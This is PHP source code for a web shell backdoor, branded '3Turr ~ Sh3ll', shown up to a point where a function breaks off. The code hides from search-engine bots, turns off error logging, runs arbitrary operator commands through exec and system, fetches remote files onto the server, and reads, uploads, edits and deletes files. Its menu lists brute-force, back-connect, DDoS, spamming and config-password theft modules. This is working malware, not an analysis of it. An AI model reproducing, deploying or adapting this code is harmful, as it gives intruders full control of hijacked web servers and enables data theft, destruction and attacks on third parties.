<?php 
// 3Turr
@define('VERSION','2.0');
@error_reporting(1);
@session_start();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if( @preg_match("/(Google|robot|bot|bing|yahoo|facebook|visionutils)/Ui",$_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

if (base64_decode($_POST['p1'], true) && ($_POST['p1'] != 'mkdir' && $_POST['p1'] != 'uploadFile') && ($_POST['p2'] != 'd2' ) ){
	
	$_POST['p1'] = base64_decode(urldecode($_POST['p1']));
}
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if (strtolower(substr(PHP_OS,0,3))=="win")
    $sys='win';
 else
    $sys='unix';
$home_cwd = @getcwd();
if(base64_decode($_REQUEST['c'], true))
$_REQUEST['c'] = base64_decode(urldecode($_REQUEST['c']));
	@chdir($_REQUEST['c']);   
$cwd = @getcwd();
if($sys == 'win') 
{
    $home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';
function yemenEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("
",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
$down=@getcwd();
if($sys=="win")
$down.='';
else
$down.='/';
if(isset($_POST['rtdown']))
{
$url = $_POST['rtdown'];
$newfname = $down. basename($url);
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
  }
if ($file) {
  fclose($file);
}
if ($newf) {
  fclose($newf);
}
}
function yemenhead()
{
    if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
 
$freeSpace = @diskfreespace($GLOBALS['cwd']);
$totalSpace = @disk_total_space($GLOBALS['cwd']);
$totalSpace = $totalSpace?$totalSpace:1;        
$on="<font color=#0F0> ON </font>";
$of="<font color=red> OFF </font>";
$none="<font color=#0F0> NONE </font>";   
if(function_exists('curl_version'))
    $curl=$on;
else
    $curl=$of;
if(function_exists('mysql_get_client_info'))
    $mysql=$on;
 else
    $mysql=$of;      
if(function_exists('mssql_connect'))
    $mssql=$on;
else
   $mssql=$of; 
if(function_exists('pg_connect'))
    $pg=$on;
else
   $pg=$of;    		
if(function_exists('oci_connect'))
   $or=$on;
else
   $or=$of;
if(@ini_get('disable_functions'))
  $disfun='<span>Disabled functions : </span><font color=red style="word-wrap: break-word;width: 80%; " >'.@str_replace(',',', ',@ini_get('disable_functions')).'</font>';
else
$disfun="<span>Disabled Functions: </span><font color=#00ff00 >All Functions Enable</font>";
if(@ini_get('safe_mode'))
$safe_modes="<font color=red>ON</font>";
else
$safe_modes="<font color=#0F0 >OFF</font>";
if(@ini_get('open_basedir'))
$open_b=@ini_get('open_basedir');
    else
  $open_b=$none;
if(@ini_get('safe_mode_exec_dir'))
$safe_exe=@ini_get('safe_mode_exec_dir');
    else
$safe_exe=$none;
if(@ini_get('safe_mode_include_dir'))
   $safe_include=@ini_get('safe_mode_include_dir'); 
else
 $safe_include=$none;
if(!function_exists('posix_getegid')) 
{
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
} else 
{
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
     $cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a  href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
$drives = "";
foreach(range('c','z') as $drive)
if(is_dir($drive.':'))
$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.base64_encode($drive.':/').'\')">[ '.$drive.' ]</a> ';

 echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>3Turr ~ Sh3ll</title>
<link rel="shortcut icon" type="image/x-icon" href="https://avatars1.githubusercontent.com/u/13343571?v=3&s=460">
<script language="javascript">
function Encoder(name)
{
	var e =  document.getElementById(name);
	e.value = btoa(e.value);
	return true;
}
function Encoder2(name)
{
	var e =  document.getElementById(name);
	e.value = btoa(e.value);
	return true;
}
</script>
<style type="text/css">
<!--
.headera { 
color: red;
}
.whole {
	
	height:auto;
	width: auto;
	margin-top: 10px;
	margin-right: 10px;
	margin-left: 10px;
    background-image: linear-gradient(
      rgba(0, 0, 0, 0.4), 
      rgba(0, 0, 0, 0.4)
    ), url(http://img03.arabsh.com/uploads/image/2012/09/11/0d37424266f70d.png);
}
.header {
table-layout: fixed;
	height: auto;
	width: auto;
	border:  4px solid #5BEEFF;
	color: yellow;
	font-size: 12px;
	font-family: Verdana, Geneva, sans-serif;
} 
tr {
  display: table-row;
  vertical-align: inherit;
  padding-right:10px;
}table {
  display: table;
  border-collapse: separate;
  border-spacing: 2px;
  border-color: #5BEEFF;
}
.header a {color:#0F0; text-decoration:none;}
span {
	font-weight: bolder;
	color: #FFF;
}
#meunlist {
	font-family: Verdana, Geneva, sans-serif;
	color: #FFF;
	background-color: #000;
	width: auto;
	border-right-width: 7px;
	border-left-width: 7px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: solid;
	border-color: #5BEEFF;
	height: auto;
	font-size: 12px;
	font-weight: bold;
	border-top-width: 0px;
}
  .whole #meunlist ul {
	padding-top: 5px;
	padding-right: 5px;
	padding-bottom: 7px;
	padding-left: 2px;
	text-align:center;
	list-style-type: none;
	margin: 0px;
}
  .whole #meunlist li {
	margin: 0px;
	padding: 0px;
	display: inline;
}
  .whole #meunlist a {
    font-family: arial, sans-serif;
	font-size: 14px;
	text-decoration:none;
	font-weight: bold;
	color: #fff;
	clear: both;
	width: 100px;
	margin-right: -6px;
	padding-top: 3px;
	padding-right: 15px;
	padding-bottom: 3px;
	padding-left: 15px;
	border-right-width: 1px;
	border-right-style: solid;
	border-right-color: #FFF;
}
  .whole #meunlist a:hover {
	color: red;
	background: #fff;
}
.menu a:hover {	background:#5BEEFF;}
a:hover        { color:red;background:black;} 
    .ml1        { border:1px solid #2438CF;padding:5px;margin:0;overflow: auto; } 
    .bigarea    { width:100%;height:250px; border:1px solid red; background:#171717;}
    input, textarea, select    { margin:0;color:#FF0000;background-color:#000;border:1px solid #5BEEFF; font: 9pt Monospace,"Times New roman"; } 
    form        { margin:0px; } 
    #toolsTbl    { text-align:center; } 
    .toolsInp    { width: 80%; } 
   .main th    {text-align:left;background-color:#990000;color:white;} 
 .main td, th{vertical-align:middle;} 
    pre            {font-family:Courier,Monospace;} 
    #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);} 
}';
if(is_writable($GLOBALS['cwd']))
 {
 echo ".foottable {
 width: 300px;
 font-weight: bold;
 }";}
 else
 {
    echo ".foottable {
 width: 300px;
 font-weight: bold;
 background-color:red;
 }
 .dir {
   background-color:red;  
 }
 "; 
 }    
 echo '.main th{text-align:left;}
 .main a{color: #FFF;}
 .main tr:hover{background-color:red;}
 .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
 .bigarea{ width:99%; height:300px; }   
  </style>
';
echo "<script>
 var c_ = '" . base64_encode(htmlspecialchars($GLOBALS['cwd'])) . "';
 var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
 var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
 var p1_ = '" . ((strpos(@$_POST['p1'],"
")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
 var p2_ = '" . ((strpos(@$_POST['p2'],"
")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
 var p3_ = '" . ((strpos(@$_POST['p3'],"
")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
 var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}</script>";
 
	echo '
</head>
<div class="whole1"></div>
<body bgcolor="#000000"  color="red" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
 <div  style="position:absolute;top:30px;right:50px; font-size:25px;font-family:auto;z-index:-1;" rowspan="8"><font color=red><img height="190px" height="190px" alt="3Turr" src="http://i.imgur.com/mVdgU0V.png" /></font><center><font style="color:#5BEEFF;text-shadow: 1px 1px 36px #5BEEFF, 0 0 25px #5BEEFF, 0 0 30px #5BEEFF, 0 0 30px #5BEEFF;">3</font><font style="color:red;text-shadow: 1px 1px 36px red, 0 0 25px red, 0 0 30px red;">Turr</font>
</div>
<div class="whole">
<form method=post name=mf style="display:none;">
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
  <div class="header"><table  class="headmain" width="100%" border="0"  align="lift">
  <tr>
 <td width="3%"><span>Uname:</span></td>
 <td colspan="2">'.substr(@php_uname(), 0, 120).'</td>
 </tr>
  <tr>
 <td><span>User:</span></td>
 <td>'. $uid . ' [ ' . $user . ' ] <span>   Group: </span>' . $gid . ' [ ' . $group . ' ] 
  </tr>
  <tr>
 <td><span>PHP:</span></td>
 <td>'.@phpversion(). '   <span>   Safe Mode: '.$safe_modes.'</span></td>
 </tr>
  <tr>
 <td><span>IP:</span></td>
 <td>'.@$_SERVER["SERVER_ADDR"].'    <span>Server IP:</span> '.@$_SERVER["REMOTE_ADDR"].'</td>
  </tr>
  <tr>
 <td><span>WEBS:</span></td>
 <td width="76%">';
 
 if($GLOBALS['sys']=='unix')
 {
$d0mains = @file("/etc/named.conf");
if(!$d0mains)
{
 echo "CANT READ named.conf";
}
else
{
  $count;  
 foreach($d0mains as $d0main)
 {
  if(@ereg("zone",$d0main))
  {
  preg_match_all('#zone "(.*)"#', $d0main, $domains);
   flush();
  if(strlen(trim($domains[1][0])) > 2){
 flush();
 $count++;
   } 
   }
   }
   echo "<b>$count</b>  Domains";
}
 }
 else{ echo"CANT READ |Windows|";}
 
   echo '</td>
 </tr>
 <tr>
 <td height="16"><span>HDD:</span></td>
 <td>'.yemenSize($totalSpace).' <span>Free:</span>' . yemenSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</td>
 </tr>';
  
  if($GLOBALS['sys']=='unix' )
{
 if(!@ini_get('safe_mode'))
 {
 
 echo '<tr><td height="18" colspan="2"><span>Useful : </span>';
 $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
  foreach($userful as $item)
 if(yemenWhich($item))
 echo $item.',';
 echo '</td>
 </tr>
  <tr>
  <td height="0" colspan="2"><span>Downloader: </span>';
 
  $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
   foreach($downloaders as $item2)
    if(yemenWhich($item2))
echo $item2.',';
echo '</td>
   </tr>';
 
  }
   else 
   {
 echo '<tr><td height="18" colspan="2"><span>useful: </span>'; 
 echo '--------------</td>
   </tr><td height="0" colspan="2"><span>Downloader: </span>-------------</td>
   </tr>';  
 }
}
else
{
   echo '<tr><td height="18" colspan="2"><span>Window: </span>';
   echo yemenEx('ver');
   
 
}  
 
 
 echo '<tr>
  <td height="16" colspan="2">'.$disfun.'</td>
  </tr>
  <tr>
 <td height="16" colspan="2"><span>cURL:'.$curl.'  MySQL:'.$mysql.'  MSSQL:'.$mssql.'  PostgreSQL:'.$pg.'  Oracle: </span>'.$or.'</td><td width="15%"></td>
  </tr>
  <tr>
  <td height="11" style="width:70%" colspan="3"><span>Open_basedir:'.$open_b.' Safe_mode_exec_dir:'.$safe_exe.'   Safe_mode_include_dir:'.$safe_include.'</td>
  </tr>
  <tr>
 <td height="11"><span>Server </span></td>
 <td colspan="2">'.@getenv('SERVER_SOFTWARE').'</td>
  </tr>';
  if($GLOBALS[sys]=="win")
  {
 echo '<tr>
 <td height="12"><span>DRIVE:</span></td>
 <td colspan="2">'.$drives.'</td>
  </tr>';
  }
  
  echo '<tr>
 <td height="12"><span>PWD:</span></td>
 <td colspan="2" >'.$cwd_links.'  <a href=# onclick="g(\'FilesMan\',\'' . base64_encode($GLOBALS['home_cwd']) . '\')"><font color=red >[HOME]</font></a></td>
  </tr>
  </table>
</div>
 <div id="menu-box">
<style type="text/css">
div#menu{height:40px;:url(http://apycom.com/ssc-data/items/1/00bfff/images/main-bg.png) repeat-x;}
div#menu ul{margin:0;padding:0;list-style:none;float:left;}
div#menu ul.menu {padding-left:10px;}
div#menu li{position:relative;z-index:9;margin:0;padding:0 5px 0 0;display:block;float:left;}
div#menu li:hover>ul {left:-2px;}
div#menu a {position:relative;z-index:10;height:40px;display:block;float:left;line-height:40px;text-decoration:none;font:normal 13px Trebuchet MS;}
div#menu a:hover {color:#000;}
div#menu li.current a {}
div#menu span {display:block;cursor:pointer;background-repeat:no-repeat;background-position:95% 0;}
div#menu ul ul a.parent span {background-position:95% 8px;background-image:url(http://apycom.com/ssc-data/items/1/00bfff/images/item-pointer.gif);}
div#menu ul ul a.parent:hover span {background-image:url(http://apycom.com/ssc-data/items/1/00bfff/images/item-pointer-mover.gif);}
div#menu a {padding:0 6px 0 10px;line-height:30px;color:#fff;}
div#menu span {margin-top:5px;}
div#menu li {background:url(http://apycom.com/ssc-data/items/1/00bfff/images/main-delimiter.png) 98% 4px no-repeat;}
div#menu li.last {background:none;}
div#menu ul ul li {background:none;}
div#menu ul ul {position:absolute;top:38px;left:-999em;width:180%;padding:1px 0 0 0;background:rgb(45,45,45);margin-top:1px;}
div#menu ul ul a {padding:0 0 0 15px;height:auto;float:none;display:block;line-height:24px;color:rgb(169,169,169);}
div#menu ul ul span {margin-top:0;padding-right:15px;_padding-right:20px;color:rgb(169,169,169);}
div#menu ul ul a:hover span {color:#fff;}div#menu ul ul li.last {background:none;}
div#menu ul ul li {width:100%;}div#menu ul ul ul {padding:1;margin:-38px 0 0 163px !important;margin-left:172px;}div#menu ul ul ul {background:rgb(41,41,41);}
div#menu ul ul ul ul {background:rgb(38,38,38);}div#menu ul ul ul ul {background:rgb(35,35,35);}
div#menu li.back {background:url(http://apycom.com/ssc-data/items/1/00bfff/images/lava.png) no-repeat right -44px !important;background-image:url(http://apycom.com/ssc-data/items/1/00bfff/images/lava.gif);width:13px;height:44px;z-index:8;position:absolute;margin:-1px 0 0 -5px;}
div#menu li.back .left {background:url(http://apycom.com/ssc-data/items/1/00bfff/images/lava.png) no-repeat top left !important;background-image:url(http://apycom.com/ssc-data/items/1/00bfff/images/lava.gif);height:44px;margin-right:8px;}
</style>
<div id="menu"><ul class="menu">
 
<li><a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')">HOME</a></li>
<li><a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')">SYSTEM</a></li>
<li><a href="#">PHP</a>
<ul>
 <li><a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')">EVAL</a></li>
<li><a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')">HASH</a></li>
</ul>
<li><a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')">SQL</a></li>
<li><a href="#" >BRUTE&CRACK</a>
<ul>
 <li><a href="#" onclick="g(\'bf\',null,\'\',\'\',\'\')">CPanel</a></li>
<li><a href="#" onclick="g(\'bruteftp\',null,\'\',\'\',\'\')">FTP</a></li>
</ul>
</li>
<li><a href="#">NETWORK</a>
<ul>
<li><a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')">BACK CONNECT</a></li>
<li><a href="#" onclick="g(\'net\',null,\'\',\'\',\'\')">BIND PORT</a></li>
</ul>
<li><a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')">DDOS</a></li>
<li><a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')">SAFE MODE</a></li>
<li><a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')">SYMLINK</a></li>
<!--
<li><a href="#" onclick="g(\'wp\',null,\'\',\'\',\'\')">Mass Wpress</a></li>
<li><a href="#" onclick="g(\'joom\',null,\'\',\'\',\'\')">Mass Joomla</a></li>
-->
<li><a href="#">Perl Sh3ll</a>
	<ul>
		<li><a href="#" onclick="g(\'perl\',null,\'\',\'\',\'\')">CGI 1.0v</a></li>
		<li><a href="#" onclick="g(\'perl4\',null,\'\',\'\',\'\')">CGI 1.4v</a></li>
	</ul>
</li>
<li><a href="#" >Mirrors</a>
<ul>
 <li><a href="#" onclick="g(\'zone\',null,\'\',\'\',\'\')">Zone-h.org</a></li>
  <li><a href="#" onclick="g(\'zonejoy\',null,\'\',\'\',\'\')">Aljyyosh.org</a></li>
</ul>
</li>
<li><a href="#">TOOLS</a>
<ul>
  <li><a href="#" onclick="g(\'rev\',null,\'\',\'\',\'\')">Reverse IP</a></li>
  <li><a href="#" onclick="g(\'zip\',null,\'\',\'\',\'\')">ZIP</a></li>
  <li><a href="#" onclick="g(\'mail\',null,\'\',\'\',\'\')">Mail Spammer</a></li>
</ul>
</li>
<li><a href="#" >3Turr-VIP</a>
<ul>
 <li><a href="#" onclick="g(\'conpass\',null,\'\',\'\',\'\')">C0nf1G-P4$$\'s</a></li>
</ul>
</li>
<li><a href="#" onclick="g(\'yemen\',null,\'\',\'\',\'\')">ABOUT</a></li>
</ul>
 
 </div>
';   
 
?>
<footer id="det" style="z-index:9999;background:#000;position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0);padding:3px; text-align:center; border-top: 1px solid #ff0000; border-bottom: 2px solid #990000;color:red;">
<font align=center>3Turr ~ SH311</font>
</footer>
<form style="z-index:9999;position:fixed;left:1;bottom:4px;display:inline" onsubmit="Encoder('encod');g('proc',null,this.c.value);return false;">
<input  style="width:290px" type=text id=encod name=c value="" placeholder="Execute" <? (!isset($_POST['a']) || $_POST['a'] != 'proc' || !isset($_POST['p1']) || $_POST['p1'] == '' ) ? print("autofocus") : 0 ; ?> >
<input type=submit style="color:red;width:30px;" value=">>">
</form>
<!--###################-->
<form  style="z-index:9999;position:fixed;right:10px;bottom:3px;display:inline;" method='post'  ENCTYPE='multipart/form-data'> 
<input type=hidden name=a value='FilesMAn'> 
<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']) ?>'> 
<input type=hidden name=p1 value='uploadFile'> 
<input type=hidden name=charset value='<?=isset($_POST['charset']) ? $_POST['charset'] : '' ?>'> 
<input style="border:1px solid #5BEEFF;height:19px;value:[   select    ];"  class="toolsInp" type=file name=f >  <input style="color:red;width:30px;" type=submit value=">>" ></form>
<?
}
function yemenfooter() {
 $is_writable = is_writable($GLOBALS['cwd'])?"<font color=#00ff00 >[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>"; 
?> 
</div> 
<table style="border: 1px solid #5BEEFF;border-top:0px;" class=info id=toolsTbl cellpadding=5 cellspacing=5 width=100%"> 
 <tr> 
<td><form onsubmit="Encoder('cdir');g(null,this.c.value);return false;"><span>Change dir:</span><br><input id=cdir class="toolsInp" type=text name=c style="color:white;" value="<?=htmlspecialchars($GLOBALS['cwd']); ?>"><input type=submit s s value=">>"></form></td> 
<td><form onsubmit="Encoder('rfile');g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input  id=rfile class="toolsInp" type=text name=f><input type=submit s s value=">>"></form></td> 
 </tr> 
 <tr> 
<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input id=mdir  class="toolsInp" type=text name=d><input type=submit s s value=">>"></form><?=$is_writable ?></td> 
<td><form onsubmit="Encoder('mfile');g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input id=mfile  class="toolsInp" type=text name=f><input type=submit s s value=">>"></form><?=$is_writable ?></td> 
   
 </tr> 
</table> 
<br><br>
</div> 
<footer id="det" style="position:fixed; left:0px; right:0px; top:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #ff0000; border-bottom: 2px solid #990000"></footer>
</body></html>
<?
}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
   function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
  function posix_getgrgid($p) {return false;} }
function yemenWhich($p) {
	$path = yemenEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
function yemenSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function yemenPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function yemenPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . yemenPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . yemenPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . yemenPerms(@fileperms($f)) . '</font>';
}
if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh)))
 		$files[] = $filename;
		return $files;
	}
}
function yemenFilesMan() {
	yemenhead();
 echo '<div class=header id=fixx ><script>p1_=p2_=p3_="";</script>';
	if(isset($_POST['p1'])) {
	//$_POST['p2'] = urldecode($_POST['p2']);
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
					echo "Can't upload file!";
				}
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			
		default:
if(!empty($_POST['p1'])) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_REQUEST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_REQUEST['c'])?$_REQUEST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo '<h3><span>|  Access Denied! |</span></h3></div>';yemenFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "
<table width='100%' class='main' cellspacing='0' cellpadding='2'  >
<form name=files method=post><tr><th>Name</th><th>Size</th><th>Date Modified</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => yemenPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.base64_encode(urlencode($f['name'])).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.base64_encode($f['path']).'\');" title=' . $f['link'] . '><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td><td>'.(($f['type']=='file')?yemenSize($f['size']):$f['type']).'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">'.$f['modify'].'</td></a><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"><font color=#0099FF >[REN]</font></a> '.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null, \''.urlencode($f['name']).'\',\'e8\')"><font color=#25ff00>[Edit]</font></a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">[DL]</a>':'').'<a href="#" onclick="g(\'FilesTools\',null, \''.urlencode($f['name']).'\',\'d2\')"> <font color=red>[Del]</font> </a></td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	</form></table></div>";
 yemenfooter();
 }
function yemenFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
if(@$_POST['p2']=='d2'){
function deleteDir($path) {
	$path = (substr($path,-1)=='/') ? $path:$path.'/';
	$dh  = opendir($path);
	while ( ($item = readdir($dh) ) !== false) {
		$item = $path.$item;
		if ( (basename($item) == "..") || (basename($item) == ".") )
			continue;
		$type = filetype($item);
		if ($type == "dir"){
		deleteDir($item);
		}
		else{
		@unlink($item);
		}
	}
	closedir($dh);
	@rmdir($path);
}
if(is_dir(@$_POST['p1'])){
deleteDir(@$_POST['p1']);
}else{
@unlink(@$_POST['p1']);
	}
}
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "e8";
				fclose($fp);
			}
		}
	}
	
